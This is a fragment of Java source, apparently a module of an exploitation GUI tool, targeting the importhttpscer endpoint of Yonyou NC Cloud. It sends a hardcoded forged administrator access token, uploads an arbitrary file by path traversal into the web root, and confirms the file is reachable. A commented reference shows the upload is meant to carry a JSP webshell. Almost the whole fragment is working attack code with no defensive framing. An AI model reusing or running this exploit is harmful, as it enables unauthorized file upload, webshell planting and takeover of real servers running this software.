...
public class yongyou_nc_cloud_importhttpscer_upload implements Exploitlnterface {
    @Override
    ...
    public static String UploadFileData(String url,String filename,String content){
        ...
        head.put("accessToken","eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA");
        String postData = "--59229605f98b8cf290a7b8908b34616b\r\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"./webapps/nc_web/"+filename+"\"\r\n" +
                "\r\n" +
                content+
                "\r\n" +
                "--59229605f98b8cf290a7b8908b34616b--";
        Response res = HttpTools.post(url+"/nccloud/mob/pfxx/manualload/importhttpscer",postData,head,"utf-8");
        if(res.getCode()==200 ){
            Response res1 = HttpTools.get(url+"/"+filename,new HashMap<>(),"utf-8");
            if( res.getText().contains(content.substring(0,2)) &&!res1.getText().isEmpty()&&res1.getCode()==200){
                return url+"/"+filename;
            }
        }
        return null;
...
//            String shell_payload = shell.readFile(shell.Jsppath);
            ...
            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_nc_cloud_importhttpscer_upload ]");
